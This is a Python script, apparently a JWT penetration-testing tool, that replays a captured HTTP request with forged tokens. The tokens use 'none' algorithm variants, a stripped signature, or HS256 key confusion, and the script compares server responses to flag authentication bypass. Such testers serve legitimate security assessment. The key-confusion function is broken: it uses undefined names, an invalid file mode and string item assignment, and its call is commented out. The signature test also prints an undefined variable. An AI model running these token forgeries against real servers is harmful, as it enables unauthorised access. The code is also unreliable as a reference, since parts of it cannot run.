#!/usr/bin/python3

# Assuming the JWT token is in the Authorization header and it is currently valid (not expired).
# Have in mind the program works by comparing a request with the original JWT and replacing it with others to make some tests.
# None algorithm with none, None, NONE, nOnE
# Lack of a valid signature, keep the algorithm, just remove the signature
# Key confusion, the program asks if you want to try it and then asks for the public key. Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to /jwks.json or /.well-known/jwks.json 
# you must provide the public key in .pem format

# Takes a request as a parameter with -r 

import sys, getopt
import requests
import re
import jwt
import base64
import json
import ast

def validate_jwt_format(jwt_token):
	# Split the JWT token into its three parts: header, payload and signature
	try:
		header, payload, signature = jwt_token.split(".")
	except ValueError:
		print("Invalid JWT format.")
		exit()
	# Validate the format of the header
	try:
		header_d = base64.urlsafe_b64decode(header + "=" * (4 - len(header) % 4))
		header_d.decode("utf-8")
	except (TypeError, UnicodeDecodeError):
		print("Invalid JWT header.")
		exit()
	# Validate the format of the payload
	try:
		payload_d = base64.urlsafe_b64decode(payload + "=" * (4 - len(payload) % 4))
		payload_d.decode("utf-8")
	except (TypeError, UnicodeDecodeError):
		print("Invalid JWT payload.")
		exit()
	return 

def get_jwt_token(headers):
	auth_header = None
	for header in headers:
		if header.startswith("Authorization: Bearer"):
			auth_header = header
			break
	if auth_header:
		jwt_token = auth_header.split()[2]
		# Verify its format
		validate_jwt_format(jwt_token)
		return jwt_token;
	else:
	    print("No authorization header found in the headers array")
	    exit()
	    
def get_host(headers):
	for header in headers:
		name, value = header.split(':')
		if name.strip().lower() == 'host':
			host_header = value.strip()
			return host_header
	print("No host header")
	exit()

def process_file(requestfile):
	with open(requestfile, 'r') as f:
		request = f.read()
	# Send the request to the server
	method = request.split()[0]
	path = request.split()[1]
	headers=request.split('\n')[1:-2]
	data=request.split('\n')[-1]
	return method, path, headers, data

def test_none(method, protocol, host, path, headers_dict, data, jwt_token):

	url = protocol+ "://" + host + path
	response1 = requests.request(method, url, headers=headers_dict, params=data)
	
	# Split and decode header
	header, payload, signature = jwt_token.split(".")
	header_d = jwt.utils.base64url_decode(header)
	header_j = json.loads(header_d.decode('utf-8'))
	
	nones = [ 'none' , 'None', 'NONE', 'nOnE'];
	for none in nones:
		header_j['alg'] = none
		header_json = json.dumps(header_j)
		# Encode the modified header to b64
		new_header = base64.urlsafe_b64encode(header_json.encode('utf-8')).decode('utf-8').rstrip("=")
		
		# Build new token
		new_jwt = new_header + "." + payload + "."
		headers_dict['Authorization'] = 'Bearer ' + new_jwt
		response2 = requests.request(method, url, headers=headers_dict, params=data)
		
		# Compare responses
		if response1.content == response2.content:
		    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to NONE ALGORITHM VULNERABILITY.')
		    print('--> A successful attempt was made by setting the algorithm to ' + none + '. The following JWT was used as payload: ' + new_jwt)
		    return
	print('[*] The application does not seem to be vulnerable to JWT None Algorithm Vulnerability.')
	return
	
def test_lack_signature(method, protocol, host, path, headers_dict, data, jwt_token):
	url = protocol+ "://" + host + path
	response1 = requests.request(method, url, headers=headers_dict, params=data)
	
	# Split and decode header
	header, payload, signature = jwt_token.split(".")

	# Build new token
	new_jwt = header + "." + payload + "."
	headers_dict['Authorization'] = 'Bearer ' + new_jwt
	response2 = requests.request(method, url, headers=headers_dict, params=data)
	
	# Compare responses
	if response1.content == response2.content:
	    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to LACK OF SIGNATURE VERIFICATION.')
	    print('--> A successful attempt was made by setting the algorithm to ' + none + '. The following JWT was used as payload: ' + new_jwt)
	    return
	    
	print('[*] The application does not seem to be vulnerable to JWT Lack of Signature Vulnerability.')
	return

def test_alg_confusion(method, protocol, host, path, headers_dict, data, jwt_token, key_file):
	# 
	if header_dict['alg'] == 'RS256':
		url = protocol+ "://" + host + path
		response1 = requests.request(method, url, headers=headers_dict, params=data)
		
		# Split and decode header
		header, payload, signature = jwt_token.split(".")
		
		# Set the algorithm to HS256
		header['alg'] = 'HS256'
		payload = jwt.decode(jwt_token, verify=False)
		
		# Get the secret key from the supplied file
		with open(key_file, 'k') as f:
			secret_key = f.read()
		
		# Build new JWT
		encoded_payload = jwt.encode(payload, key=secret_key, algorithm='HS256')
		new_token = header.decode('utf-8').strip() + '.' + encoded_payload.decode('utf-8').strip() + '.'
		new_jwt = header + "." + payload + "."
		headers_dict['Authorization'] = 'Bearer ' + new_jwt
		
		# Send new request
		response2 = requests.request(method, url, headers=headers_dict, params=data)
		if response1.content == response2.content:
		    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to KEY CONFUSION.')
		    print('--> A successful attempt was made by setting the algorithm to HS256 and using the supplied key. The following JWT was used as payload: ' + new_jwt)
		    return
		print('[*] The application does not seem to be vulnerable to KEY CONFUSION.')
		return
	else:
		return
	

def main(argv):
	requestfile = ''
	publickeyfile = ''
	protocol = "https";
	try:
		opts, args = getopt.getopt(argv,"r:p:k:",["rfile=", "protocol=", "key="])
	except getopt.GetoptError:
		print ('python3 JWT_security_check.py -r <request file> [-p <https|http>] [-k <public key file>]')
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print ('Usage: python3 JWT_security_check.py -r <requestfile> [-p <https|http>] [-k <public key file>]')
			sys.exit()
		elif opt in ("-r", "--rfile"):
			requestfile = arg
		elif opt in ("-k", "--key"):
			publickeyfile = arg
		elif opt in ("-p", "--protocol"):
			if arg.lower() == "http" or arg.lower() == "https":
				protocol = arg.lower()
			else:
				print("Invalid protocol, defaulting to HTTPS.");
	method, path, headers, data = process_file(requestfile)
	
	# Not very efficient to go over the headers twice but it makes the code easier to understand
	jwt_token = get_jwt_token(headers)
	host = get_host(headers)
	headers_dict = {}
	
	for header in headers:
		key, value = header.split(': ')
		headers_dict[key] = value
	test_none(method, protocol, host, path, headers_dict, data, jwt_token)
	test_lack_signature(method, protocol, host, path, headers_dict, data, jwt_token)
	#test_key_confusion(method, protocol, host, path, headers_dict, data, jwt_token, publickeyfile)
	


if __name__ == "__main__":
	main(sys.argv[1:])